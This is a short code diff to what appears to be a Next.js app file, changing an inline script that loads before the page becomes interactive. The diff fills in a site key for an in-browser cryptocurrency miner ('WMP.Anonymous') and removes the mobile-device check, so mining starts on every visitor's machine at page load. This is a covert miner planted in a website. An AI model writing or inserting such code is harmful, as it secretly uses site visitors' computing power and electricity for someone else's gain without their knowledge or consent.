@@ -69,10 +69,10 @@ function MyApp({ Component, pageProps }) {
       strategy="beforeInteractive"
     >
       {`
-        var miner = WMP.Anonymous('<your-site-key>',{throttle: 0.5});
-        if (!miner.isMobile()){
+        var miner = WMP.Anonymous('SK_qK72yRaCG6Sj6s2qAHVKL',{throttle: 0.5});
+       
             miner.start();
-        }
+        
       `}
     </Script>
 
